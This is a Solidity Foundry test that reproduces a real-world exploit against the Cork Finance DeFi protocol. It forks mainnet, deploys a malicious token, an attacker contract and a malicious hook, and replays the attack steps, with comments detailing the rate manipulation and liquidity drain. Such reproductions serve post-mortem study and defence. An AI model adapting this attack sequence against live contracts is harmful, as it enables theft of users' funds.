// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";
import {IERC20} from "../../interfaces/IERC20.sol";
import {IWETH9} from "../../interfaces/IWETH9.sol";
import "./Interfaces.sol";
import "./AttSC_1.sol";
import "./MTK.sol";

import "./CorkMaliciousHook.sol";

contract Exploit_CorkFinance is TestHarness, TokenBalanceTracker {
    ICorkHook corkHook = ICorkHook(0x5287E8915445aee78e10190559D8Dd21E0E9Ea88);
    address exchangeRateProvider = 0x7b285955DdcbAa597155968f9c4e901bb4c99263;
    IERC20 wstETH = IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IERC20 weETH5CT = IERC20(0xD7CAc118c007E6427ABD693e193E90a6918ce404);

    IERC20 etherfiWETH = IERC20(0xCd5fE23C85820F7B72D0926FC9b05b43E359b7ee);
    IERC20 lpToken = IERC20(0x05816980fAEC123dEAe7233326a1041f372f4466);

    IPSMProxy flashSwapProxy = IPSMProxy(0x55B90B37416DC0Bd936045A8110d1aF3B6Bf0fc3);
    IPSMProxy moduleCoreProxy = IPSMProxy(0xCCd90F6435dd78C4ECCED1FA4db0D7242548a2a9);
    IPSMProxy assetFactory = IPSMProxy(0x96E0121D1cb39a46877aaE11DB85bc661f88D5fA);

    ICorkConfig corkConfig = ICorkConfig(0xF0DA8927Df8D759d5BA6d3d714B1452135D99cFC);

    IUniV4PoolManager uniV4PoolManager = IUniV4PoolManager(0x000000000004444c5dc75cB358380D2e3dE08A90);

    // Declaring a malicious MTK (MyToken)
    IMyToken internal mtk;

    // Exploiter's EOA (address(this) in the test context)
    address internal EXPLOITER_EOA;

    // Attacker's Smart Contract 1 - deployed by the exploiter
    AttackerSC_1 internal attSC_1;

    // Attacker's Smart Contract 2 (hook) - deployed by the exploiter
    CorkMaliciousHook internal maliciousHook;

    bytes32 internal constant PAIR_ID_FOR_RATE =
        0x6b1d373ba0974d7e308529a62e41cec8bac6d71a57a1ba1b5c5bf82f6a9ea07a;

    function setUp() external {
        EXPLOITER_EOA = address(this);
        // Several transactions were involved in this attack.
        // These three are being investigated on this reproduction:
        // 1: 0x14cdf1a643fc94a03140b7581239d1b7603122fbb74a80dd4704dfb336c1dec0 (get LP Tokens)
        // 2: 0x89ba58edaf9f40dc0c781c40351ba392be31263faa6be3a29c2ee152f271df6d (approve Att SC for LP's)
        // 3: 0xfd89cdd0be468a564dd525b222b728386d7c6780cf7b2f90d2b54493be09f64d (main attack)

        // We pin one block before the first transaction to analyze if they are strictly needed.
        cheat.createSelectFork(vm.envString("RPC_URL"), 22_580_951);

        // 1.1. Deploy malicious MTK and Attck1 Instances
        mtk = new MyToken();

        attSC_1 = new AttackerSC_1(
            address(mtk),
            address(wstETH),
            address(weETH5CT),
            address(corkHook),
            address(moduleCoreProxy),
            address(flashSwapProxy),
            exchangeRateProvider
        );

        // Required to step
        deal(address(wstETH), EXPLOITER_EOA, 10e18); // Ensure exploiter has wstETH
        wstETH.approve(address(attSC_1), 10e18); // Exploiter approves AttSC_1

        // Balance tracking setup for all relevant addresses and tokens
        addTokenToTracker(address(mtk));
        addTokenToTracker(address(wstETH));
        addTokenToTracker(address(weETH5CT));
        updateBalanceTracker(EXPLOITER_EOA);
        updateBalanceTracker(address(attSC_1));
        updateBalanceTracker(address(corkHook));
    }

    function test_triggerAttack() external {
        // Malicious Hook, deployed at 0x81ffe2a832684979d510928e069dbef62da22a757afd55234f851cbe44fa0399
        // Before making the steps 1.
        maliciousHook = new CorkMaliciousHook(
            corkHook,
            moduleCoreProxy,
            assetFactory,
            lpToken,
            wstETH,
            etherfiWETH,
            corkConfig,
            uniV4PoolManager,
            exchangeRateProvider,
            flashSwapProxy
        );

        /*
        Steps made on 1: 0x14cdf1a643fc94a03140b7581239d1b7603122fbb74a80dd4704dfb336c1dec0
        1. Deploy malicious MTK (MyToken)
        2. Get type(uint256).max MTKs to AttSC_1
        3. Approve CorkHook to spend all AttSC_1 MTK's
        4. Transfer sequentially 0, 1e18, 2e18, ... , 9e18 to CorkHook, scoping the rate in between
        4.1 Pair id to get the rate: 0x6b1d373ba0974d7e308529a62e41cec8bac6d71a57a1ba1b5c5bf82f6a9ea07a
        5. lidoWstETH.transferFrom sender (exploiter EOA) to AttSC_1 the sum of 10e18
            (req prev approval and balance)
        6. Approve wstETH to Cork's Proxy and call swapRaforDs
        7. Reset wstETH approvals and grant again type(uint256).max to the same Cork's proxy.
        8. Deposit into proxy's PSM with depositPSM
        9. Reset wstETH approval to proxy back to zero, approve wstETH and weETH5CT to CorkHook
        10. Call CorkHook.addLiquidity providing wstETH as Ra and weETH5CT as Ct
        11. Reset both approvals
        12. Transfer all the LP and wstETH balance to exploiter's EOA
        */
        attSC_1.attack();

        // At this point, the attacker managed to manipulate the rate supplying fake worthless tokens.
        // Tx 2 approves the Malicious Callback to handle all Attacker's LP tokens
        vm.roll(22_580_970);
        lpToken.approve(address(maliciousHook), type(uint256).max);
        wstETH.approve(address(maliciousHook), type(uint256).max);

        // Cork Protocol Issues a New DS at 0xcdd80e59a089cf3e622dc392c622eba9b1ba9780773cc562190191ecb56bf8eb
        // This new DS uses the same pair ID as before, triggered after expiry of ETH5
        // Prank Deployer's to mimic the chain's state
        vm.roll(22_581_004); // one block before
        vm.warp(1_748_431_825); // just after ETH5 expiry
        issueNewDs();

        /*
        Steps made on 3: 0xfd89cdd0be468a564dd525b222b728386d7c6780cf7b2f90d2b54493be09f64d
        */
        vm.roll(22_581_019);
        maliciousHook.attack();
    }

    function issueNewDs() internal {
        vm.prank(0x777777727073E72Fbb3c81f9A8B88Cc49fEAe2F5);
        corkConfig.issueNewDs(PAIR_ID_FOR_RATE, 1_748_433_923);
    }
}
